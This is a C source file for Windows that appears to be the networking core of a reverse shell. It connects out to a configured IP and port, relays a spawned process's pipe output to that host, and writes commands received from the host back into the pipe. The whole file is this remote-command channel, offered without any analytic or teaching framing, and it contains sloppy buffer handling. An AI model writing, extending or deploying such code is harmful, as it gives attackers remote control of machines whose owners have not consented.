#include "../headers/header.h"

void init_socket()
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char buffer[1000];
    char recvbuf[DEFAULT_BUFLEN];
    int sended = 0;
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    printf("IP = %s\n", IP);
    printf("PORT = %s\n", PORT);

    iResult = getaddrinfo(IP, PORT, &hints, &result);

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR)
        {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            //main();
        }
        break;
    }
    freeaddrinfo(result);

    pipe_init();

    for (;;)
    {
        Sleep(300);
        if (!sended)
        {
            frompipe(pipe->HANDLES[3], NULL);
            if (OUTPUT_size > 0)
            {
                send(ConnectSocket, OUTPUT_text, 4096, 0);
            }
            memset(OUTPUT_text, 0, 4096);
            sended = 1;
        }
        else
        {
            iResult = recv(ConnectSocket, buffer, recvbuflen, 0);
            if (iResult == SOCKET_ERROR)
            {
                closesocket(ConnectSocket);
                ConnectSocket = INVALID_SOCKET;
                for (int h = 0; h < 4; h++)
                {
                    CloseHandle(pipe->HANDLES[h]);
                }
            }
            if (iResult)
            {
                WriteFile(pipe->HANDLES[1], buffer, strlen(buffer), NULL, 0);
                memset(buffer, 0, 1000);
                buffer[0] = '\0';
                sended = 0;
            }
        }
    }
    closesocket(ConnectSocket);
    WSACleanup();
}